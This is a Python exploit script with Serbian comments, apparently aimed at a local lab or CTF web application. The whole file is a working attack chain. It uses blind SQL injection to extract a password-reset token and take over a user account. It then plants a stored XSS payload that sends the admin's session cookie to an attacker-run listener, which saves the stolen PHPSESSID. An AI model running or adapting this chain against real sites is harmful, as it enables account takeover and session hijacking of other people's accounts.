import requests
import string
import time
import re
from http.server import BaseHTTPRequestHandler, HTTPServer

# --- KONFIGURACIJA ---
BASE_URL = "http://localhost:8000"
TARGET_USER = "user1"
NEW_PASSWORD = "StudentiPobedjuju123!"
LPORT = 8001
COOKIE_FILE = "admin_cookie.txt"

session = requests.Session()

# --- POMOĆNA KLASA ZA HVATANJE KOLAČIĆA ---
class CookieGrabber(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
        
        # Tražimo PHPSESSID u URL-u (npr. /?cookie=PHPSESSID=...)
        match = re.search(r'PHPSESSID=([a-zA-Z0-9]+)', self.path)
        if match:
            captured_id = match.group(1)
            print(f"\n[!!!] PRESRETNUT ADMIN PHPSESSID: {captured_id}")
            with open(COOKIE_FILE, "w") as f:
                f.write(captured_id)
            print(f"[*] Identifikator sesije je sacuvan u: {COOKIE_FILE}")
            print("[*] Gasim osluskivac... Lanac je uspesno zavrsen.")
            # Gasimo server nakon sto dobijemo sta nam treba
            raise KeyboardInterrupt 

    def log_message(self, format, *args):
        return # Iskljucujemo standardni ispis servera radi preglednosti

def stage_1_auth_bypass():
    print(f"--- STAGE 1: Authentication Bypass ({TARGET_USER}) ---")
    session.post(f"{BASE_URL}/forgotpassword.php", data={"username": TARGET_USER})
    
    alphabet = string.digits + string.ascii_letters
    token = ""
    print("[*] Izvlacenje reset tokena: ", end="", flush=True)
    
    for i in range(1, 33):
        for char in alphabet:
            payload = f"{TARGET_USER}' AND (SELECT SUBSTR(token,{i},1) FROM tokens WHERE uid=(SELECT uid FROM users WHERE username='{TARGET_USER}') ORDER BY tid LIMIT 1)='{char}';--"
            r = session.post(f"{BASE_URL}/forgotusername.php", data={"username": payload})
            if "User exists!" in r.text:
                token += char
                print(char, end="", flush=True)
                break
    
    res = session.post(f"{BASE_URL}/resetpassword.php", data={
        "token": token, "password1": NEW_PASSWORD, "password2": NEW_PASSWORD
    })
    
    if "Password changed!" in res.text:
        print(f"\n[+] Lozinka za {TARGET_USER} promenjena.")
        time.sleep(1)
        return True
    return False

def stage_2_privilege_escalation():
    print(f"\n--- STAGE 2: Privilege Escalation (XSS Injection) ---")
    
    # 1. Login
    session.post(f"{BASE_URL}/login.php", data={"username": TARGET_USER, "password": NEW_PASSWORD})
    
    # 2. Postavljanje XSS-a (Gadja i Docker bota i tvoj lokalni test)
    xss_payload = f"<script>fetch('http://host.docker.internal:{LPORT}/?cookie=' + document.cookie).catch(e => {{fetch('http://localhost:{LPORT}/?cookie=' + document.cookie);}});</script>"
    
    session.post(f"{BASE_URL}/profile.php", data={"description": xss_payload, "update": "1"})
    print("[+] Stored XSS uspesno postavljen.")
    
    # 3. Pokretanje privremenog servera za hvatanje kolacica
    print(f"[*] Pokretanje osluskivaca na portu {LPORT}... Cekam admina.")
    server = HTTPServer(('0.0.0.0', LPORT), CookieGrabber)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()

if __name__ == "__main__":
    if stage_1_auth_bypass():
        stage_2_privilege_escalation()